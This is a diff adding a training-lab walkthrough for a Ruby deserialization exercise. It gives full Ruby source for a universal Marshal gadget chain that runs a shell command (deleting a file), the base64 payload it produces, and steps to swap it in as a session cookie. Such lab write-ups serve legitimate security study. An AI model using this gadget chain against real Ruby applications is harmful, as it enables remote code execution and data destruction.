@@ -75,5 +75,100 @@ Copy this in the base64 part, and apply changes. Send the request and we solved 
 Task 5:
 ///Lab: Exploiting Ruby deserialization using a documented gadget chain///
 
-BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
+Open the site in burp, and log in as wiener/peter.
+This is our account request:
+GET /my-account?id=wiener HTTP/2
+Host: 0a0e0073030f4e488277429500dd001e.web-security-academy.net
+Cookie: session=BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVxOTU4bHZ0YmcwYm1kaTk4eTkydWU3bGIzYWY2Z25jeAY7B0YK
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a0e0073030f4e488277429500dd001e.web-security-academy.net/login
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+As you can see our session cookie is starting with BAh...thats a really stong indicate that this session cookie contains a serialized ("marshaled") Ruby object. In the lab hind we have a clue:
+"Try searching for "ruby deserialization gadget chain" online." If you do this, you will find a site with this title:
+"Universal Deserialisation Gadget for Ruby 2.x-3.x" at the end of the page there is a code under this line "The final gadget could then be constructed to trigger a call to Kernel.system("id"):"
+We will use this code as a base.
+I used an online compiler (https://www.onlinegdb.com/) to try this code out. The first thing is to modify the id to rm /home/carlos/morale.txt:
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+And delete this two lines:
+puts payload.inspect
+puts Marshal.load(payload)
+And istead of this 2, add this one:
+puts Base64.encode64(payload)
 
+Now try to run it. To be honest it didnt work for me, i suffered a lot to make it work, and after a lot of trying and consuling with gemini this code worked:
+require 'net/protocol'
+require 'base64'
+require 'rubygems/package'
+require 'rubygems/request_set'
+
+wa1 = Net::WriteAdapter.allocate 
+wa1.instance_variable_set('@socket', Kernel)
+wa1.instance_variable_set('@method_id', :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.allocate
+wa2.instance_variable_set('@socket', rs)
+wa2.instance_variable_set('@method_id', :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+require 'rubygems/spec_fetcher'
+require 'rubygems/installer'
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+
+puts Base64.encode64(payload)
+
+After i clicked on run i got this code:
+BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
+OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
+b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
+ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
+YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
+bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
+aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
+LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
+But this wont be good, because the \r\n line endings are in the code, and we want to put them out. So in terminal i typed this into:
+echo "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
+OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
+b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
+ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
+YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
+bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
+aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
+LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==" | tr -d "\n\r"
+And i got this code:
+BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
+Now we can copy this out, in inspector mode change the session cookie to this, refresh the page, and we solved the lab.
